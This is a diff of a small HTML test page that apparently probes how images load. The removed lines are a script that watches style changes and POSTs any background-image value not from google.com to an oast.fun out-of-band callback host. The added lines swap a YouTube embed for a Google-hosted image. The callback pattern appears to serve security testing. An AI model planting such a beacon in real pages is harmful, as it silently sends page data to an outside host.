@@ -1,35 +1,9 @@
 <html>
 <head>
     <script>
-        const observer = new MutationObserver((mutations) => {
-    mutations.forEach((mutation) => {
-        if (mutation.attributeName === "style") {
-            const element = mutation.target;
-            const bgImage = window.getComputedStyle(element).backgroundImage;
-            if (bgImage && !bgImage.includes("google.com")) {
-                fetch("https://qazijugyysfldrhhnshhv32q1hby0nxnd.oast.fun", {
-                    method: "POST",
-                    body: JSON.stringify({ violation: bgImage }),
-                    headers: { "Content-Type": "application/json" }
-                });
-            }
-        }
-    });
-});
-
-// Wait for the body to be available before observing
-if (document.readyState === "loading") {
-    document.addEventListener("DOMContentLoaded", () => {
-        observer.observe(document.body, { attributes: true, subtree: true, attributeFilter: ["style"] });
-    });
-} else {
-    observer.observe(document.body, { attributes: true, subtree: true, attributeFilter: ["style"] });
-}
-
-
     </script>
 </head>
     <body>
-        <iframe width="560" height="315" src="https://www.youtube.com/embed/TwtjzPZj2XY?si=KiVANxgUTBhs3j5E" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>
+    <img src="https://lh3.google.com/u/0/d/152iRo0ZqWkqZAy8zhAToUdTQl3jWlOYHDJQ4GbLXK2g"></img>    
     </body>
 </html>
